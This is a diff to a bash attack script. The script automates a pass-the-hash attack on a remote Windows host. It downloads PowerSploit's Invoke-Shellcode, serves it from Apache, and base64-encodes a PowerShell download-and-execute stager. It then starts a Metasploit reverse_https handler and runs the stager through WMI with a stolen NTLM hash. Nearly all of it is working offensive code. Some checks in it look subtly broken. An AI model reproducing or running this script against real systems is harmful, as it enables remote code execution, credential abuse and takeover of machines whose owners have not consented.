@@ -12,7 +12,6 @@ then
 	exit 1
 fi
 
-#argument $3 should be 32:32 (65 characters)
 len=${#3}
 if [ $len -ne 65 ]
 then
@@ -20,17 +19,14 @@ then
 	exit 1
 fi
 
-#argument $5 should be an integer between 1-65535 and not in use
-#change to netstat
-check=`lsof -i :$5`
-if [[ -z "$check" ]]
+check=`netstat -ln | grep ":$5 " | wc -l`
+if [ "$check" -ge 1 ]
 then
 	echo "Port $5 is in use. Kill the process or specify another port"
 	exit 1
 fi
 
-#its late
-if [ $5 -ge 1 ] && [ $5 -lt 65535 ]
+if [ ! "$5" -ge 1 ] && [ ! "$5" -le 65535 ]
 then
 	echo "Local port for handler must be between 1-65535."
 	exit 1
@@ -42,11 +38,20 @@ hash=$3
 lhost=$4
 lport=$5
 
-#check to see if Apache is running, if not start it
 result=`pgrep apache`
 if [[ -z "$result" ]]
 then 
+	echo "Apache is not started, starting the apache service..."
 	service apache2 start
+fi
+
+portcheck=`nmap -p135 $rhost | grep open | wc -l`
+if [ "$portcheck" -eq 0 ]
+then
+	echo "TCP 135 is not open on $rhost"
+	exit 1
+else
+	echo "The remote port is open but other used ports may not be!"
 fi
 
 #download invoke-shellcode from github and save as /var/www/plugin
@@ -56,13 +61,19 @@ wget -O /var/www/plugin https://raw.github.com/mattifestation/PowerSploit/master
 func="Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force"
 echo "$func" >> /var/www/plugin
 
-#base64 encode the stager scriptblock: {iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')}
-scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')"
-encode="echo `echo $scriptblock | base64 -w 0`"
+#base64 encode the stager scriptblock
+scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$lhost/plugin")"
+echo "The stager command is $scriptblock"
+encode="`echo $scriptblock | base64 -w 0`"
+echo "The encoded scriptblock is $encode"
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
+echo "The commandline syntax is $command"
 
-#start multi/handler 
-msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
+echo "Starting the multi handler"
+sleep 3
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E &
 
-#pth with WMI to execute meterpreter
-wmis -U $user%$hash //$rhost "$command"
+#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command""
+/pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"
+
+fg 1
